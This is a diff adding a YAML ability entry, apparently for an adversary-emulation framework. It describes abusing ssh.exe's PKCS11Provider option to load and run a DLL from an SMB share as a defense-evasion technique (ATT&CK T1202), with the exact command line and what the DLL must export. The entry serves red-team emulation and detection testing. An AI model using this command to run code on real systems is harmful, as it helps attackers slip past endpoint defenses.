@@ -1,0 +1,27 @@
+- id: 3bc51f05-41e0-01d4-5d24-02a53ed07020
+  name: ssh.exe - Executes a DLL from an SMB share by abusing the PKCS11Provider option.
+    The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList
+    to prevent premature termination by `ssh.exe`. Note that all backslashes should
+    be escaped (i.e. every `\` should be turned into `\\`).
+  description: Executes a DLL from an SMB share by abusing the PKCS11Provider option.
+    The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList
+    to prevent premature termination by `ssh.exe`. Note that all backslashes should
+    be escaped (i.e. every `\` should be turned into `\\`).
+  tactic: defense-evasion
+  technique:
+    attack_id: T1202
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: ssh -o PKCS11Provider="\\\\127.0.0.1\\Temp\\example.dll" win@github.com
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Akshat Pradhan
+  created: '2021-11-08'
+  modified: '2021-11-08'
+  operating_system: Windows All Versions
